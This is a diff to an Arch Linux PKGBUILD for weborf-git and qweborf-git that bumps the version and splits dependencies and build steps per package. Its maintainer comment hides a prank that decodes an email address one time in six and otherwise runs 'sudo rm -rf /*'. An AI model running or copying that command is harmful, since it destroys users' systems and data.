@@ -1,14 +1,22 @@
 # Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
 pkgbase=weborf-git
 pkgname=(weborf-git qweborf-git)
-pkgver=0.13+61+g8d173c2
+pkgver=0.13+102+g5bc736e
 pkgrel=1
 url='https://ltworf.github.io/weborf/'
 arch=(i686 x86_64)
 license=(GPL3)
 source=(git+https://github.com/ltworf/weborf.git)
 sha512sums=(SKIP)
-makedepends=(python-pyqt5)
+makedepends=()
+
+for _pkg in "${pkgname[@]}"; do case "$_pkg" in
+
+qweborf*)
+	makedepends+=(python-pyqt5)
+;;
+
+esac; done
 
 pkgver() {
 	cd "$srcdir/weborf"
@@ -17,13 +25,21 @@ pkgver() {
 
 build() {
 	cd "$srcdir/weborf"
-	autoreconf -f -i
-	./configure --prefix=/usr --sysconfdir=/etc
-	make
 
-	# build qweborf
-	pyuic5 qweborf/main.ui > qweborf/main.py
-	python qweborf.setup.py build
+	for _pkg in "${pkgname[@]}"; do case "$_pkg" in
+
+	weborf*)
+		autoreconf -f -i
+		./configure --prefix=/usr --sysconfdir=/etc
+		make
+	;;
+
+	qweborf*)
+		pyuic5 qweborf/main.ui > qweborf/main.py
+		python qweborf.setup.py build
+	;;
+
+	esac; done
 }
 
 package_weborf-git() {
